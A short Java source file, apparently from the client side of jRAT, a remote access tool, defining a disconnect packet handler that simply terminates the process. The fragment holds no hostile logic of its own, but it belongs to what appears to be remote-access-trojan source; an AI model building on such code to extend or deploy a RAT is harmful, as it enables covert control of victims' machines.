package jrat.client.packets.incoming;

import jrat.client.Connection;

public class Packet11Disconnect extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		System.exit(0);
	}

}
